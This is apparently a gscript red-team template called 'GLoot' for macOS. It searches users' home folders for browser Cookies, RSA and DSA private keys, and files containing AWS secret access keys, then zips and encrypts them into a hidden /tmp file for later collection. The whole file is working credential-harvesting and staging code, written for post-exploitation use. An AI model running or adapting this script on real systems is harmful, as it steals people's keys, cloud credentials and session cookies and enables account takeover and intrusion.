// Example gscript template
// Title: GLoot 
// Author: ahhh
// Purpose: Searches for files and can zip+encrypt them
// Gscript version: 1.0.0
// ATT&CK: 

//priority:180
//timeout:150

//go_import:os as os
//go_import:github.com/ahhh/gloot as loot


function Deploy() {  
    console.log("Starting GLoot");

    // Prompt for the pw
    var ignoreNames = ["Keychains", ".vmdk", ".vmem", ".npm", ".vscode", ".dmg", "man1", ".ova", ".iso"];
    var ignoreContent = ["golang.org/x/crypto"];
    var includeNames = ["Cookies"];
    var includeContent = ["BEGIN DSA PRIVATE KEY", "BEGIN RSA PRIVATE KEY", "secret_access_key"];

    var goods = loot.Searcher("/Users/", ignoreNames, ignoreContent, includeNames, includeContent);
    console.log("the goods: "+ goods);

    // Pickup our prompter pw
    //goods.push("/private/tmp/gscript_special.txt");
    
    var file_location = "/private/tmp/ozz";
    var errs = loot.ZipFiles(file_location, goods, "testing");
    if (errs != null) {
        console.log("errors: "+errs.Error());
    } else {
        console.log("file newly created: " + file_location);
    }  

    console.log("Done GLoot");
    return true;
}